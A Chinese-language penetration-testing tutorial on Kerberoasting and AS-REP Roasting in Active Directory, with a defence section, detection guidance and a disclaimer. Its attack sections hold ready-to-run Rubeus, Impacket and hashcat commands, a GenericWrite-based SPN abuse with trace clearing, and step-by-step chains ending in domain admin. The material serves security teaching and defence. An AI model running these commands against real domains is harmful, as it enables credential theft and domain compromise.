---
title: Kerberoasting与AS-REP Roasting
date: 2025-05-05 08:00:00
tags:
  - 内网渗透
  - 密码学
  - 渗透测试
description: Kerberoasting 与 AS-REP Roasting——SPN 服务账户密码爆破与 Hashcat 破解。
categories: 渗透测试
---

## 前言

在Active Directory域环境中，Kerberos协议是默认的身份认证机制。攻击者在获得域内任意一个普通用户权限后，可以利用Kerberos协议的设计特性，离线破解服务账户的明文密码——这类攻击统称为"Kerberoasting"。其威力在于不需要提权、不需要横向移动，只凭一个普通域用户身份即可发起。与其原理相似但攻击路径不同的还有AS-REP Roasting，它甚至不需要任何认证即可完成攻击。本文将从SPN概念出发，系统性地梳理这两种攻击的原理、工具链与防御策略。

## 一、SPN（Service Principal Name）

SPN是Kerberos体系中用于唯一标识服务实例的名称，标准格式为：

```
serviceclass/host:port/servicename
```

常见示例：`HTTP/webserver.domain.local`、`MSSQLSvc/sql01.domain.local:1433`、`CIFS/dc01.domain.local`。

SPN记录存储在Active Directory的`servicePrincipalName`属性中，通常与域用户（服务账户）或计算机账户关联。对攻击者而言，SPN是一份"服务清单"——通过枚举域内所有SPN可快速发现Web服务、数据库、域控等关键资产。更关键的是，任何拥有SPN的账户，其TGS票据（Ticket Granting Service）都可以被域内任意用户申请并导出，这正是Kerberoasting攻击的基础。

## 二、Kerberoasting攻击原理

Kerberos认证涉及三个阶段：

1. **AS-REQ / AS-REP**：用户向KDC证明身份，获得TGT（Ticket Granting Ticket）。
2. **TGS-REQ / TGS-REP**：用户使用TGT向KDC申请访问特定服务的服务票据（Service Ticket/ST）。
3. **AP-REQ / AP-REP**：用户使用ST向目标服务发起认证。

Kerberoasting的关键在第二阶段。KDC使用**服务账户的NTLM哈希**加密ST的某一部分后返回给用户。攻击者可将ST导出到离线环境，通过字典或暴力破解恢复服务账户的明文密码：

```
普通域用户 --> 枚举SPN --> 请求TGS票据 --> 导出加密ST
    --> 离线破解（hashcat / john） --> 获得明文密码
```

**攻击条件**：拥有有效域用户凭据（无需高权限）、目标注册了SPN、服务账户密码强度低。

## 三、Rubeus GetUserSPNs

Rubeus是GhostPack团队开发的C#工具，集成了多种Kerberos攻击功能，是Kerberoasting的首选工具。

```powershell
# 枚举域内所有SPN并请求TGS票据
Rubeus.exe kerberoast

# 指定域控制器与输出文件
Rubeus.exe kerberoast /domain:corp.local /dc:dc01.corp.local /outfile:hashes.txt

# 筛选高价值目标（指定SPN或LDAP过滤器）
Rubeus.exe kerberoast /spn:MSSQLSvc/sql01.corp.local
Rubeus.exe kerberoast /ldapfilter:"admincount=1"
```

Rubeus输出的Hash格式为Hashcat mode 13100（RC4-HMAC），形如：

```
$krb5tgs$23$*user$domain$MSSQLSvc/sql01.corp.local*$hex$hex...
```

其中`$23$`表示RC4加密类型，这是最易破解的类型。AES加密（`$18$`）的破解难度极大，实际攻击中攻击者更关注RC4票据。

## 四、Impacket-GetUserSPNs

Impacket工具集中的GetUserSPNs.py是Python实现的Kerberoasting工具，适用于非Windows攻击环境。

```bash
# 枚举所有SPN并请求TGS票据（明文密码认证）
impacket-GetUserSPNs -request -dc-ip 192.168.1.10 corp.local/user:password

# 使用NTLM哈希认证（Pass-the-Hash）
impacket-GetUserSPNs -request -dc-ip 192.168.1.10 \
    -hashes :<ntlm_hash> corp.local/user

# 指定目标用户并保存到文件
impacket-GetUserSPNs -request -dc-ip 192.168.1.10 \
    corp.local/user:password -request-user sql_svc -outputfile hashes.txt
```

## 五、Hashcat破解TGS票据

### 5.1 Mode 13100（RC4加密）

```bash
# 基础字典攻击
hashcat -m 13100 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt

# 规则+字典（组合爆破）
hashcat -m 13100 -a 0 hashes.txt dict.txt -r best64.rule

# 掩码攻击（8位所有可打印字符）
hashcat -m 13100 -a 3 hashes.txt ?a?a?a?a?a?a?a?a

# 混合攻击（字典+掩码后缀）
hashcat -m 13100 -a 6 hashes.txt dict.txt ?d?d?d?d

# GPU优化模式
hashcat -m 13100 -a 0 -O -w 3 hashes.txt dict.txt
```

### 5.2 Mode 19700（AES加密）

当TGS票据使用AES-256加密时，对应mode 19700。破解速度极慢，除非目标密码极弱（如纯数字短密码），否则不具备实际破解性。**这也是防御Kerberoasting的关键策略之一——强制域内使用AES加密。**

### 5.3 定制化破解策略

基于目标组织的密码策略和命名规范生成定制字典，是提高破解成功率的核心。例如已知某公司采用`SeasonYear!`模式，可使用hashcat的规则组合`(Summer|Winter|Spring)(20\d{2})!`快速爆破。

## 六、AS-REP Roasting：无需认证的攻击

### 6.1 攻击原理

AS-REP Roasting攻击Kerberos认证的**第一阶段**。当域用户启用了"不要求Kerberos预身份认证"（UF_DONT_REQUIRE_PREAUTH，userAccountControl标志位4194304）时，攻击者可在**不知道密码的情况下**，以该用户身份向KDC发送AS-REQ请求。KDC会返回使用用户NTLM哈希加密的AS-REP响应，攻击者将其离线破解：

```
攻击者 --> 伪造AS-REQ（声称是目标用户） --> KDC返回AS-REP
    --> 导出加密部分 --> 离线破解（hashcat mode 18200）
    --> 获得目标用户明文密码
```

### 6.2 枚举与攻击执行

```powershell
# 枚举关闭预认证的用户（PowerView）
Get-DomainUser -PreauthNotRequired -Verbose

# Rubeus一键执行AS-REP Roasting
Rubeus.exe asreproast /outfile:asrep_hashes.txt
Rubeus.exe asreproast /user:targetuser /outfile:target.hash
```

```bash
# Impacket方式——无需任何域凭据
impacket-GetNPUsers -dc-ip 192.168.1.10 corp.local/ -usersfile users.txt

# 指定单个用户
impacket-GetNPUsers -dc-ip 192.168.1.10 corp.local/targetuser -no-pass

# 批量输出为hashcat格式
impacket-GetNPUsers -dc-ip 192.168.1.10 corp.local/ \
    -usersfile users.txt -format hashcat -outputfile asrep_hashes.txt
```

### 6.3 Hashcat Mode 18200

```bash
# AS-REP Hash格式：$krb5asrep$23$user@domain:hash...
hashcat -m 18200 -a 0 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
hashcat -m 18200 -a 0 -O -w 3 asrep_hashes.txt dict.txt -r best64.rule
```

## 七、SetSPN在攻击链中的利用

SetSPN.exe是Windows原生SPN管理工具。在Kerberoasting攻击中，SetSPN与ACL滥用结合可实现攻击面的扩展。

当攻击者拥有的账户对另一个域用户具有GenericWrite或WriteProperty权限时，可以为其添加SPN，随后对该账户执行Kerberoasting：

```powershell
# 为目标用户添加SPN（需要写权限）
setspn -s HTTP/temp.corp.local target_user

# 或通过PowerShell AD模块
Set-ADUser -Identity target_user -Add @{
    "servicePrincipalName" = "TEST/test.corp.local"
}

# 执行Kerberoasting获取TGS票据
Rubeus.exe kerberoast /user:target_user

# 清除痕迹
Set-ADUser -Identity target_user -Clear servicePrincipalName
```

这种攻击链在BloodHound中表现为"GenericWrite → Force SPN Change → Kerberoast"路径，是内网渗透中的经典提权路线。

## 八、两种攻击对比与破解效率

| 维度 | Kerberoasting | AS-REP Roasting |
|------|---------------|-----------------|
| 所需权限 | 任意域用户 | **无需任何凭据** |
| 攻击目标 | 注册了SPN的服务账户 | 关闭预认证的账户 |
| Kerberos阶段 | TGS-REP | AS-REP |
| Hashcat Mode | 13100 (RC4) / 19700 (AES) | 18200 |
| 破解速度(RTX 4090) | ~2.5 GH/s | ~85 MH/s |
| 利用场景 | 提权、横向移动 | 初始突破、发现弱密码 |
| 目标特征 | 高权限服务账户 | 遗留账户、配置不当的用户 |

实际渗透中，Kerberoasting的RC4票据破解速度约为AS-REP的30倍，因此服务账户的弱密码风险远高于普通用户。但AS-REP Roasting的价值在于**零门槛**——无需任何凭据即可发起，适合外网打点场景。

## 九、防御措施

### 9.1 账户与密码管理

- **使用组托管服务账户（gMSA）**：Windows Server 2012及以上支持，AD自动管理复杂度随机密码轮换，攻击者即使拿到票据也无法破解——这是对抗Kerberoasting的最有效手段。
- **服务账户强密码**：如无法使用gMSA，至少设置25位以上随机密码，使用密码管理器生成。
- **定期审计SPN**：使用BloodHound或脚本检查不必要的SPN注册并及时移除。
- **审计预认证设置**：定期检查关闭预认证的用户（userAccountControl标志位4194304）：

```powershell
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} \
    -Properties DoesNotRequirePreAuth
```

### 9.2 加密策略

在组策略中配置Kerberos仅使用AES-256加密类型，禁止RC4：

- **组策略路径**：`Computer Configuration\Policies\Windows Settings\Security Settings\Local Policies\Security Options\Network security: Configure encryption types allowed for Kerberos`
- 虽然AES票据理论上也可破解（mode 19700），但计算速度极慢，实际威慑力显著。

### 9.3 监控与检测

- **Event ID 4769**：大量TGS-REQ请求，尤其是Ticket Encryption Type为0x17（RC4）的大量申请，需立即排查。
- **Event ID 4768**：Pre-Authentication Type为0的TGT请求，来自异常IP时需要关注。
- **蜜罐账户**：创建带有弱密码和SPN的蜜罐服务账户，任何人对其执行Kerberoasting即告警——这是检测攻击行为的高性价比手段。
- **网络分段**：限制普通用户网段直接访问域控88端口，通过IDS/IPS检测异常Kerberos流量模式。

### 9.4 审计脚本

```powershell
# 定期审计所有SPN注册账户
Get-ADUser -Filter {ServicePrincipalName -like "*"} \
    -Properties ServicePrincipalName |
    Select-Object Name, SamAccountName, ServicePrincipalName |
    Export-Csv -Path "SPN_Audit_$(Get-Date -Format yyyyMMdd).csv"
```

## 十、实战场景

### 场景一：经典Kerberoasting提权

```
1. 钓鱼获得普通域用户 user01 / Summer2024!
2. BloodHound枚举SPN -> 发现MSSQLSvc关联sql_svc账户
3. Rubeus.exe kerberoast 导出TGS票据
4. hashcat -m 13100 字典破解 -> sql_svc:Summer2024!
5. sql_svc属于Domain Admins组 -> 域完全控制
```

### 场景二：AS-REP Roasting外网打点

```
1. LDAP匿名查询枚举域用户列表
2. impacket-GetNPUsers批量探测关闭预认证的用户
3. 发现backup用户易受AS-REP Roasting攻击
4. hashcat -m 18200 破解 -> backup:Admin123!
5. 使用backup凭据获取域内初始立足点
```

### 场景三：SetSPN权限滥用提权

```
1. BloodHound发现user01对helpdesk_svc有GenericWrite权限
2. Set-ADUser为helpdesk_svc添加SPN
3. Rubeus kerberoast获取helpdesk_svc的TGS票据
4. hashcat破解获得密码 -> Domain Admins组成员
5. Set-ADUser清除SPN，抹去痕迹
```

## 十一、免责声明

> **本文所讨论的技术和方法仅供安全研究与授权的渗透测试使用。**
>
> 未经系统所有者明确书面授权，对计算机系统进行任何形式的攻击、渗透测试或安全评估均属违法行为，可能违反《中华人民共和国网络安全法》《刑法》等相关法律法规。作者不承担因读者不当使用本文所述技术而导致的任何法律责任。
>
> 如果您是网络防御者，请利用本文知识加固您的Active Directory环境，定期审计SPN配置，确保所有服务账户使用gMSA或强密码策略。
>
> **记住：技术无善恶，但使用技术的人有选择。用这些知识保护系统，而不是破坏它。**

## 参考资源

- [Tim Medin - Kerberoasting (SANS Hackfest 2014)](https://files.sans.org/summit/hackfest2014/PDFs/Kerberoasting.pdf)
- [Rubeus - GhostPack](https://github.com/GhostPack/Rubeus)
- [Impacket - Fortra](https://github.com/fortra/impacket)
- [Hashcat Example Hashes](https://hashcat.net/wiki/doku.php?id=example_hashes)
- [gMSA Overview - Microsoft Learn](https://learn.microsoft.com/en-us/windows-server/security/group-managed-service-accounts/group-managed-service-accounts-overview)
